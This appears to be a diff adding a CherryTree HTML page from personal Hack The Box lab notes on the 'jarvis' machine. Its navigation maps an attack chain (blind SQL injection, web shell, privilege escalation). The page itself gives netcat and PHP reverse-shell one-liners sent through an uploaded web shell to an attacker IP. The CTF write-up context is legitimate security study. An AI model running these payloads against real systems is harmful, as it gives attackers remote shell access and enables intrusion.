@@ -1,0 +1,54 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>reverse shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="HacktheBox--Linux_Boxes--jarvis.html">jarvis</a></p>
+
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--nmapAutomator.html">nmapAutomator</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection).html">manual sqlinjection (Blind SQL injection)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--Error_based_Blind_SQL_Injection.html">Error based Blind SQL Injection</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--revshell.php.html">revshell.php</a></li>
+<li><a href="-jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--Exploit_the_SQL_injection_to_add_php_code_into_a_file_on_the_system.html">Exploit the SQL injection to add php code into a file on the system</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--sqlmap.html">sqlmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--sqlmap--sqlmap_--os-shell.html">sqlmap --os-shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper.html">privesc to pepper</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py.html">simpler.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py--ping_method.html">ping method</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py_privesc.html">simpler.py privesc</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--linEnum.sh.html">linEnum.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--linEnum.sh--SUID_files.html">SUID files</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--lse.sh.html">lse.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO.html">system.ctl GTFO</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO--Systemctl_misconfigured_permissions_sudo-SUID.html">Systemctl misconfigured permissions sudo/SUID</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO--root.service.html">root.service</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">taking the </span><span style="color:#ffff00;">netcat openbsd</span><span style="color:#24ff00;"> reverseshell from </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">payloadallthethings</a><br /><img src="images/1204-1.png" alt="images/1204-1.png" /><br /><span style="color:#ffa500;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.14.62 1337 &gt;/tmp/f</span><br /><br /><span style="color:#24ff00;">and urlencoding it with </span><span style="color:#ffa500;">ctrl+z </span><span style="color:#24ff00;">a</span><br /><br /><span style="color:#ffa500;">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.62%201337%20%3E%2Ftmp%2Ff</span><br /><br /><span style="color:#24ff00;">when we send it through the shell script we've uploaded </span><br /><span style="color:#ffa500;">10.10.10.143.sh3ll.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.62%201337%20%3E%2Ftmp%2Ff</span><br /><img src="images/1204-2.png" alt="images/1204-2.png" /><br /><br /><span style="color:#24ff00;">we get a </span><span style="color:#ffff00;">shell</span><span style="color:#24ff00;">!</span><br /><img src="images/1204-3.png" alt="images/1204-3.png" /><br /><br /><span style="color:#24ff00;">this (url encoded) works too</span><br /><span style="color:#ffa500;">10.10.10.143.sh3ll.php?c=php -r '$sock=fsockopen("10.10.14.62",4242);$proc=proc_open("/bin/sh -i", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'</span><br /><br /></div></div>
+</body></html>
